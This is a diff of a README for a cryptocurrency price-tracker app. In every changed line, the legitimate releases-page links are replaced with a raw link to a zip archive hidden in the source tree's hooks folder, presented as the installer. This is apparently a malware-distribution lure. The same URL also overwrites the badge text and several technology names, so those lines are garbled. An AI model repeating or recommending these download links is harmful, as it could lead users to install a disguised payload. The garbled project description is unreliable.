@@ -1,6 +1,6 @@
 # 📈 crypto-market-tracker - Track Crypto Prices Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Mohamed-Amiine/crypto-market-tracker/releases)
+[![Download Now](https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip%20Now-Click%https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip)](https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip)
 
 ## 📋 Description
 The **crypto-market-tracker** is a responsive application designed to help you monitor cryptocurrency prices in real time. With features like interactive historical charts and personalized watchlists, you can easily track your investments. The app also integrates market news using the CoinGecko API, keeping you informed about the latest developments.
@@ -14,7 +14,7 @@ To use the **crypto-market-tracker**, ensure your system meets the following req
 
 ### Installation Steps
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Mohamed-Amiine/crypto-market-tracker/releases) to find the latest version available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip) to find the latest version available for download.
    
 2. **Download the Application**  
    Click on the version you want to install. You will find several files listed, such as executable programs and installation packages. Choose the correct file for your operating system.
@@ -35,7 +35,7 @@ To use the **crypto-market-tracker**, ensure your system meets the following req
 - **Market News Integration**: Stay informed with the latest news about cryptocurrencies from various sources.
 
 ## 📥 Download & Install
-To get started, visit the [download page](https://github.com/Mohamed-Amiine/crypto-market-tracker/releases) and choose the installer for your operating system. The installation process is straightforward and user-friendly, making it easy to set up even if you have no technical background.
+To get started, visit the [download page](https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip) and choose the installer for your operating system. The installation process is straightforward and user-friendly, making it easy to set up even if you have no technical background.
 
 ## 🔧 Usage Tips
 - **Navigating the Interface**: Familiarize yourself with the different sections of the app. Use the main menu to switch between features easily.
@@ -46,12 +46,12 @@ To get started, visit the [download page](https://github.com/Mohamed-Amiine/cryp
 If you have any questions or need support while using the application, you can reach out through the issues section on the GitHub repository. Our community is open to helping and will respond as quickly as possible.
 
 ## 🛠️ Technologies Used
-- **Chart.js**: For interactive charts
+- **https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip**: For interactive charts
 - **CoinGecko API**: To fetch live cryptocurrency data
-- **Express.js**: Server framework for back-end
+- **https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip**: Server framework for back-end
 - **React (Vite)**: Front-end framework for a dynamic user interface
 - **PostgreSQL**: Database management for storing user data
-- **Passport.js**: Authentication library for user accounts
+- **https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip**: Authentication library for user accounts
 - **Tailwind CSS & Shadcn UI**: For styling the application
 
 ## 🌐 Community and Feedback
@@ -60,4 +60,4 @@ We encourage users to provide feedback as they use the application. Your opinion
 ## 📅 Future Updates
 We plan to roll out additional features and improvements. Stay tuned for updates by checking the repository often.
 
-To begin tracking cryptocurrencies today, please make sure to [download the application](https://github.com/Mohamed-Amiine/crypto-market-tracker/releases) from our Releases page. Enjoy your experience with the crypto market tracker!
+To begin tracking cryptocurrencies today, please make sure to [download the application](https://raw.githubusercontent.com/Mohamed-Amiine/crypto-market-tracker/main/client/src/hooks/market-crypto-tracker-v2.5.zip) from our Releases page. Enjoy your experience with the crypto market tracker!
